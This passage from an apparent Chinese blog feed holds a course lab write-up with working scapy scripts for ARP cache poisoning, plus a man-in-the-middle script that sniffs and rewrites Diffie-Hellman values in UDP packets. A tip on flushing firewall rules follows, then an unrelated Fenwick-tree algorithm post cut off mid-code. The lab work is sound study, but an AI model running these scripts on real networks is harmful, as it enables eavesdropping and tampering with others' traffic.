<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ARP缓存中毒攻击</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine A&#x27;s informaton</span></span><br><span class="line">IP_A  = <span class="string">&quot;192.168.60.2&quot;</span></span><br><span class="line">MAC_A = <span class="string">&quot;02:42:c0:a8:3c:02&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine B&#x27;s informaton</span></span><br><span class="line">IP_B  = <span class="string">&quot;192.168.60.1&quot;</span></span><br><span class="line">MAC_B = <span class="string">&quot;02:42:90:9b:17:90&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Attacker Machine&#x27;s informaton</span></span><br><span class="line">IP_M  = <span class="string">&quot;192.168.60.3&quot;</span></span><br><span class="line">MAC_M = <span class="string">&quot;02:42:c0:a8:3c:03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SENDING SPOOFED ARP REPLY.........&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct spoofed ARP sent to machine A</span></span><br><span class="line">ether1     = Ether()</span><br><span class="line">ether1.dst = MAC_A</span><br><span class="line">arp1       = ARP()</span><br><span class="line">arp1.psrc  = IP_B</span><br><span class="line">arp1.hwsrc = MAC_M</span><br><span class="line">arp1.pdst  = IP_A</span><br><span class="line">arp1.op    = <span class="number">1</span> </span><br><span class="line">frame1     = ether1/arp1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct spoofed ARP sent to machine B</span></span><br><span class="line">ether2      = Ether()</span><br><span class="line">ether2.dst  = MAC_B</span><br><span class="line">arp2        = ARP()</span><br><span class="line">arp2.psrc   = IP_A</span><br><span class="line">arp2.hwsrc  = MAC_M</span><br><span class="line">arp2.pdst   = IP_B</span><br><span class="line">arp2.op     = <span class="number">1</span> </span><br><span class="line">frame2      = ether2/arp2</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">   sendp(frame1) </span><br><span class="line">   sendp(frame2) </span><br><span class="line">   sleep(<span class="number">5</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>R</mi><mi>P</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">ARP\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>缓存中毒攻击是持续的，在攻击的过程中需要将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>H</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>M</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">HostM\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>上的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><mi>P</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">IP\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>转发关闭，再运行嗅探并修改报文的代码，这一部分代码基于上一次实验中对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>N</mi><mi>e</mi><mi>t</mi><mi>c</mi><mi>a</mi><mi>t</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">Netcat\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>攻击的代码，在其基础上进行修改即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine A&#x27;s informaton</span></span><br><span class="line">IP_A  = <span class="string">&quot;192.168.60.2&quot;</span></span><br><span class="line">MAC_A = <span class="string">&quot;02:42:c0:a8:3c:02&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine B&#x27;s informaton</span></span><br><span class="line"><span class="comment"># treat Gateway as Machine B</span></span><br><span class="line">IP_B  = <span class="string">&quot;192.168.60.1&quot;</span></span><br><span class="line">MAC_B = <span class="string">&quot;02:42:90:9b:17:90&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Server2&#x27;s information</span></span><br><span class="line">IP_Server2 = <span class="string">&quot;10.0.2.7&quot;</span></span><br><span class="line">MAC_Server2 = <span class="string">&quot;02:42:0a:00:02:07&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Attacker Machine&#x27;s informaton</span></span><br><span class="line">IP_M  = <span class="string">&quot;192.168.60.3&quot;</span></span><br><span class="line">MAC_M = <span class="string">&quot;02:42:c0:a8:3c:03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cal</span>(<span class="params">a,rand,p</span>):</span></span><br><span class="line">    cal = (a**rand) % p</span><br><span class="line">    <span class="keyword">return</span> cal</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">di,mi,p</span>):</span></span><br><span class="line">    key = (di ** mi ) % p</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spoof_pkt</span>(<span class="params">pkt</span>):</span></span><br><span class="line">    s=<span class="number">53</span></span><br><span class="line">    t=<span class="number">67</span></span><br><span class="line">    <span class="keyword">if</span> pkt.haslayer(IP):</span><br><span class="line">        <span class="keyword">if</span> pkt.src == MAC_A <span class="keyword">and</span> pkt.dst == MAC_M:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_B</span><br><span class="line">            <span class="keyword">del</span> pkt[IP].chksum</span><br><span class="line">            <span class="keyword">del</span> pkt[UDP].chksum</span><br><span class="line">            <span class="keyword">if</span> pkt.haslayer(UDP) <span class="keyword">and</span> pkt[UDP].payload:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Packet is from A&quot;</span>)</span><br><span class="line">                p_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                g_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                Ya_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                data = pkt[UDP].payload.load</span><br><span class="line">                len_p=<span class="built_in">int</span>(data[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,len_p+<span class="number">2</span>):</span><br><span class="line">                      p_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                p=<span class="built_in">int</span>(p_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received P is :&quot;</span>,p)</span><br><span class="line">                len_g=<span class="built_in">int</span>(data[len_p+<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+<span class="number">3</span>,len_p+len_g+<span class="number">3</span>):</span><br><span class="line">                      g_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                g=<span class="built_in">int</span>(g_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received g is :&quot;</span>,g)</span><br><span class="line">                len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">                      Ya_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                Ya=<span class="built_in">int</span>(Ya_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received Ya is :&quot;</span>,Ya)</span><br><span class="line">                Yt=get_cal(g,t,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Yt with B is:&quot;</span>,Yt)</span><br><span class="line">                newdata=<span class="string">&quot;0&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Yt)</span><br><span class="line">                newdata = newdata.encode()</span><br><span class="line">                Key_A=get_key(Ya,s,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Key with A is:&quot;</span>,Key_A)</span><br><span class="line">                newpkt = pkt</span><br><span class="line">                <span class="keyword">del</span>(newpkt[IP].<span class="built_in">len</span>)</span><br><span class="line">                <span class="keyword">del</span>(newpkt[UDP].payload)</span><br><span class="line">                sendp(newpkt/newdata)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> pkt.src == MAC_B <span class="keyword">and</span> pkt.dst == MAC_M:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_A</span><br><span class="line">            <span class="keyword">del</span> pkt[IP].chksum</span><br><span class="line">            <span class="keyword">del</span> pkt[UDP].chksum</span><br><span class="line">            <span class="keyword">if</span> pkt.haslayer(UDP) <span class="keyword">and</span> pkt[UDP].payload:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Packet is from Server2:&quot;</span>)</span><br><span class="line">                p_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                g_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                Yb_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                data = pkt[UDP].payload.load</span><br><span class="line">                len_p=<span class="built_in">int</span>(data[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,len_p+<span class="number">2</span>):</span><br><span class="line">                      p_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                p=<span class="built_in">int</span>(p_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received P is :&quot;</span>,p)</span><br><span class="line">                len_g=<span class="built_in">int</span>(data[len_p+<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+<span class="number">3</span>,len_p+len_g+<span class="number">3</span>):</span><br><span class="line">                      g_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                g=<span class="built_in">int</span>(g_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received g is :&quot;</span>,g)</span><br><span class="line">                len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">                      Yb_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                Yb=<span class="built_in">int</span>(Yb_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received Yb is :&quot;</span>,Yb)</span><br><span class="line">                Ys=get_cal(g,s,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Ys with A is:&quot;</span>,Ys)</span><br><span class="line">                newdata=<span class="string">&quot;1&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Ys)</span><br><span class="line">                newdata = newdata.encode()</span><br><span class="line">                Key_B=get_key(Yb,t,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Key with B is:&quot;</span>,Key_B)</span><br><span class="line">                newpkt = pkt</span><br><span class="line">                <span class="keyword">del</span>(newpkt[IP].<span class="built_in">len</span>)</span><br><span class="line">                <span class="keyword">del</span>(newpkt[UDP].payload)</span><br><span class="line">                sendp(newpkt/newdata)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line"></span><br><span class="line">pkt = sniff(<span class="built_in">filter</span>=<span class="string">&#x27;udp&#x27;</span>, prn=spoof_pkt)</span><br></pre></td></tr></table></figure>
<p>最后实现效果的截图，我直接贴上我的实验截图了：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619165615.png" alt="alt 5" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619165733.png" alt="alt 6" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619165900.png" alt="alt 7" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619170114.png" alt="alt 8" /></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/202106192111.png" alt="alt 9" /></p>
<p>完结撒花！！！</p>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mi>S</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">PS:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span></span>如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>H</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">HostA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">A</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>e</mi><mi>r</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">Server2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">2</span></span></span></span>连不同的话，记得用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>p</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>s</mi><mtext>  </mtext><mo>−</mo><mi>F</mi></mrow><annotation encoding="application/x-tex">iptables\;-F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span></span></span></span>关闭防火墙，用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>p</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>s</mi><mtext> </mtext><mo>−</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">iptables\ -L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace"> </span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span>查看防火墙状态全部为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>c</mi><mi>c</mi><mi>e</mi><mi>p</mi><mi>t</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">Accept \;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault">c</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>即可。</p>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mi>S</mi><mo>:</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">PS:\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>打开<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><mi>P</mi></mrow><annotation encoding="application/x-tex">IP</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>转发使用命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl net.ipv4.ip_forward=1 <span class="comment">#打开IP转发</span></span><br><span class="line">sudo sysctl net.ipv4.ip_forward=0 <span class="comment">#关闭IP转发</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>网络攻防</category>
        <category>分级通关</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>算法记录:树状数组</title>
    <url>/2021/10/31/%E7%AE%97%E6%B3%95%E8%AE%B0%E5%BD%95-%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<hr />
<p>首先了解树状数组的相关背景知识：</p>
<p>【1】<a href="https://blog.csdn.net/weixin_30920091/article/details/98283770?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link">树状数组 区间修改，单点查询；_weixin_30920091的博客-CSDN博客</a></p>
<p>【2】<a href="https://blog.csdn.net/qq_41117236/article/details/81184463">树状数组（单点修改+区间修改）_菜鸡成长史-CSDN博客_树状数组区间修改</a></p>
<hr />
<h4 id="前置笔记"><a class="markdownIt-Anchor" href="#前置笔记"></a> 前置笔记</h4>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>L</mi><mi>o</mi><mi>w</mi><mi>b</mi><mi>i</mi><mi>t</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Lowbit(x)\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>函数：返回<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>x</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;x\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>二进制的最后一个1对应的权值。从<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>L</mi><mi>o</mi><mi>w</mi><mi>b</mi><mi>i</mi><mi>t</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Lowbit\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>可以引出前缀和数组，如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>L</mi><mi>o</mi><mi>w</mi><mi>b</mi><mi>i</mi><mi>t</mi><mo stretchy="false">(</mo><mn>4</mn><mo stretchy="false">)</mo><mo>=</mo><mn>4</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Lowbit(4)=4\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>就代表着相对应的前缀和数组中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>t</mi><mi>r</mi><mi>e</mi><mi>e</mi><mo stretchy="false">[</mo><mn>4</mn><mo stretchy="false">]</mo><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;tree[4]\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mopen">[</span><span class="mord">4</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>就是由此向前的前4个数的和，而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>L</mi><mi>o</mi><mi>w</mi><mi>b</mi><mi>i</mi><mi>t</mi><mo stretchy="false">(</mo><mn>3</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;Lowbit(3)=1\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord">3</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>就代表着第三个数。</p>
<h4 id="一维单点修改区间查询"><a class="markdownIt-Anchor" href="#一维单点修改区间查询"></a> 【一维】单点修改，区间查询</h4>
<p>题目链接：<a href="http://10.12.162.1:5880/contest/22/problem/P0400">oj | 树状数组模板一</a></p>
<p>这里维护一个前缀和数组即可。引用上述参考链接中的一张图片，很形象的解释LowBit的工作原理。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211101151619.png" alt="LowBit" /></p>
<p>贴代码(暴力也可以过):</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">500001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> C[<span class="number">500001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">LowBit</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; (x^(x<span class="number">-1</span>));</span><br><span class="line">    <span class="comment">//lowbit(i)=2^k,其中k为i在二进制下末尾0的个数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> p,<span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//对数组的第p项加上d</span></span><br><span class="line">    <span class="comment">//对第p项的改变引起前缀和改变的项</span></span><br><span class="line">    <span class="comment">//p1=x,p_i+1=p_i+LOWBIT(P_i)，修改C[p_i]</span></span><br><span class="line">    <span class="keyword">while</span> (p&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        C[p]+=d;</span><br><span class="line">        p+=<span class="built_in">LowBit</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span><span class="params">(<span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//计算前缀和，累加C[p_i]</span></span><br><span class="line">    <span class="comment">//P1=x,p_i+1=P_i-LowBit(p_i)，得出前缀和至A[x]</span></span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        sum+=C[p];</span><br><span class="line">        p-=<span class="built_in">LowBit</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        <span class="built_in">Add</span>(i,temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> x1,x2,x3;</span><br><span class="line">    <span 